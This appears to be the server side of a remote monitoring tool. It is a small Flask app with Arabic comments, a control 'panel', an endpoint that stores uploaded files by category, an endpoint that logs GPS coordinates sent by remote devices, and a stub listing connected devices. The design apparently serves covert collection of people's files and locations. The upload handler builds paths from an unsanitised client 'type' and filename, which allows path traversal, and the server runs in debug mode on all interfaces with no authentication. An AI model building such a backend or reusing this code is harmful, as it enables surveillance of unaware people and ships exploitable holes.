from flask import Flask, request, jsonify, render_template
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template('panel.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return 'No file uploaded', 400
        
        file = request.files['file']
        file_type = request.form.get('type', 'unknown')
        
        if file.filename == '':
            return 'No selected file', 400
        
        # إنشاء مجلد للنوع
        type_folder = os.path.join(UPLOAD_FOLDER, file_type)
        os.makedirs(type_folder, exist_ok=True)
        
        # حفظ الملف
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}_{file.filename}"
        file_path = os.path.join(type_folder, filename)
        file.save(file_path)
        
        print(f"File uploaded: {file_path}")
        return 'File uploaded successfully', 200
        
    except Exception as e:
        print(f"Upload error: {e}")
        return 'Upload failed', 500

@app.route('/location')
def receive_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    timestamp = request.args.get('time')
    
    print(f"Location received: {lat}, {lon} at {timestamp}")
    
    # حفظ الموقع في ملف
    with open('locations.txt', 'a') as f:
        f.write(f"{timestamp},{lat},{lon}\n")
    
    return 'Location received', 200

@app.route('/devices')
def list_devices():
    # عرض الأجهزة المتصلة
    devices = []
    return jsonify(devices)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
